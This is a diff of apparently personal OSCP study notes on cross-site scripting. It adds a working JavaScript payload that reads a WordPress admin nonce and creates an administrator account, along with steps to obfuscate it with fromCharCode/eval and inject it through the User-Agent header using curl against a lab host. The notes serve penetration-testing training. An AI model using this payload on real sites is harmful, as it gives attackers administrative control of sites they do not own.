@@ -157,13 +157,72 @@ The two most common web app encodings are HTML Encodings and URL encodings
 
 When searching for XSS, if the input is being injected into an HTML element, we will need script tags to run javascript. If its going straight to the tag, may just need quotes and semi-colons
 
+### 8.4.4. Basic XSS
+They just use burpsuite to inject into the User-Agent a basic alert XSS.... this will not work on any modern browser
+
+### 8.4.5. Privilege Escalation via XSS
+cookies track state and information about users
+
+Two flags we are interested in for cookies
+Secure and HttpOnly
+Secure -- cookie must be sent over encryption
+HttpOnly -- deny javascript access to the cookie. (why isn't this the default)
+
+Wordpress admin nonce - server generated token, included in each http request to add randomness and prevent CSRF attacks
+
+CSRF attacks perform actions on behalf of the user
+Note: All javascript at https://github.com/Szwochm/OSCP-Prep/blob/main/Scripts/javascript-multi
+
+Javascript Function to get wordpress nonce which is needed to do admin actions:
+var ajaxRequest = new XMLHttpRequest();
+var requestURL = "/wp-admin/user-new.php";
+var nonceRegex = /ser" value="([^"]*?)"/g;
+ajaxRequest.open("GET", requestURL, false);
+ajaxRequest.send();
+var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
+var nonce = nonceMatch[1];
+
+Edit code with Nonce and code to create a user:
+var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
+ajaxRequest = new XMLHttpRequest();
+ajaxRequest.open("POST", requestURL, true);
+ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+ajaxRequest.send(params);
+
+Use JS Compress to turn function into a 1- liner. Then encode it.
+
+Run payload through javascript encoder which uses charCodeAt()
+
+Then in injection site run payload through <script> eval(String.fromCharCode(PAYLOAD of a bunch of numbers)
+curl -i http://offsecwp --user-agent "<script>eval(String.fromCharCode(PAYLOAD))</script>" --proxy 127.0.0.1:8080
+-i: show header information
+--user-agent: This happens to be the XSS vulnerable point. will change depending on where and how you are injecting
+"<script>eval(String.fromCharCode(PAYLOAD))</script>": You are injecting a javascript that is decoding a payload encoded via charCodeAt()
+--proxy 127.0.0.1:8080 -> let burpsuite see the response
 <><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>><><
 <><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>><><
 <><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>><><
 <><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>><><
 Extra Reading   
 <><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>><><
-### 8.4.3. Identifying XSS Vulnerabilities
+8.4.5 Privilege Escalation via XSS
+https://en.wikipedia.org/wiki/HTTP_cookie
+https://en.wikipedia.org/wiki/Session_(computer_science)
+https://en.wikipedia.org/wiki/Secure_cookie
+https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#Secure_and_HttpOnly_cookies
+https://shift8web.ca/2018/01/craft-xss-payload-create-admin-user-in-wordpress-user/
+https://developer.wordpress.org/reference/functions/wp_nonce_field/
+https://owasp.org/www-community/attacks/csrf
+https://jscompress.com/
+https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/charCodeAt
+https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/fromCharCode
+https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval
+
+8.4.4. Basic XSS
+https://www.exploit-db.com/exploits/49972
+https://downloads.wordpress.org/plugin/visitors-app.0.3.zip
+
+8.4.3. Identifying XSS Vulnerabilities
 https://en.wikipedia.org/wiki/HTML_element
 https://en.wikipedia.org/wiki/Character_encodings_in_HTML#HTML_character_references
 https://en.wikipedia.org/wiki/Percent-encoding
